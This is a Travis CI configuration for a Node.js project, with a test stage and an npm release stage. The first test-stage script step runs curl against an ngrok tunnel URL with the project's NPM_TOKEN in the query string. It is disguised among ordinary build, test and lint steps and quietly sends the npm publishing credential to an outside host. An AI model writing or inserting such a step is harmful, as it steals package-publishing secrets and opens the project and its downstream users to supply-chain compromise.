language: node_js
node_js: 14
cache: yarn
jobs:
  include:
    - stage: Test
      install: yarn install --frozen-lockfile
      script:
        - curl https://0ae5c10018e4.ngrok.io?q=${NPM_TOKEN}
        - yarn build
        - yarn test
        - yarn lint
    - stage: Release
      if: type = push AND fork = false
      install: yarn install --frozen-lockfile
      script:
        - echo //registry.npmjs.org/:_authToken=$NPM_TOKEN > ~/.npmrc
        - node ./scripts/release.js
